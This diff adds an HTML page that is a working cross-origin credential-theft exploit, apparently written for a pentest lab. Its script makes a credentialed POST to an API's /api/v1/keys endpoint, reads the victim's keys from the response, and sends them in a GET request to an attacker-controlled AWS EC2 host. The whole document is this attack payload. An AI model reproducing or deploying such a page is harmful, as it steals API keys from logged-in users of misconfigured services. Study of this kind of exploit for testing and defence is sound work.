@@ -1,0 +1,16 @@
+<html>
+	<body>
+		<script>
+var xhr = new XMLHttpRequest(); 
+xhr.open("POST","http://api-ptl-fbafd824-4fabf863.libcurl.so/api/v1/keys",false); 
+xhr.withCredentials = true;	
+xhr.send();
+var a=xhr.responseText;
+
+var xhr2 = new XMLHttpRequest(); 
+xhr2.open("GET","http://ec2-3-6-126-24.ap-south-1.compute.amazonaws.com/"+a,false); 
+xhr2.withCredentials = true;	
+xhr2.send();
+		</script>
+	</body>
+</html>
